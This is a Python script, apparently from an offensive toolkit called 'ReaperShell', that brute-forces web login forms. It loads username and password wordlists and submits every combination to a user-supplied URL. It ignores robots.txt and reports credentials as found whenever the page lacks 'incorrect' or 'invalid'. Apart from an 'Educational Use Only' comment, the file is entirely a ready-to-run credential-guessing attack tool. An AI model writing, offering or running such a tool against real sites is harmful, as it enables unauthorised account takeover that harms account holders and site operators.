#!/usr/bin/env python3
# web_form_cracker.py - Login Form Brute Forcer
# Author: KERILL-REDBYTEV | For Educational Use Only

import mechanize
import time
import os
import sys
from bs4 import BeautifulSoup

def banner():
    os.system("clear")
    print("="*50)
    print("        ReaperShell - Web Form Cracker")
    print("="*50)

def brute_force(url, userlist, passlist, user_field="username", pass_field="password"):
    browser = mechanize.Browser()
    browser.set_handle_robots(False)

    # Load users and passwords
    try:
        with open(userlist, "r") as ufile:
            users = [line.strip() for line in ufile if line.strip()]
        with open(passlist, "r") as pfile:
            passwords = [line.strip() for line in pfile if line.strip()]
    except FileNotFoundError as e:
        print(f"[!] File not found: {e}")
        return

    total_attempts = len(users) * len(passwords)
    print(f"[*] Loaded {len(users)} usernames and {len(passwords)} passwords ({total_attempts} total attempts)")

    try:
        for username in users:
            for password in passwords:
                print(f"[~] Trying {username}:{password}")
                browser.open(url)
                browser.select_form(nr=0)

                browser[user_field] = username
                browser[pass_field] = password
                response = browser.submit()

                html = response.read().decode("utf-8")
                if "incorrect" not in html.lower() and "invalid" not in html.lower():
                    print(f"\n[✓] Success: {username}:{password}")
                    return
    except Exception as e:
        print(f"[!] Error during brute force: {e}")
        return

    print("\n[×] Brute-force complete. No valid credentials found.")

def main():
    banner()
    url = input("[?] Enter login form URL: ").strip()
    userlist = input("[?] Enter path to username wordlist: ").strip()
    passlist = input("[?] Enter path to password wordlist: ").strip()
    user_field = input("[?] Enter name of username field [default: username]: ").strip() or "username"
    pass_field = input("[?] Enter name of password field [default: password]: ").strip() or "password"

    brute_force(url, userlist, passlist, user_field, pass_field)

    input("\nPress ENTER to return to menu...")

if __name__ == "__main__":
    main()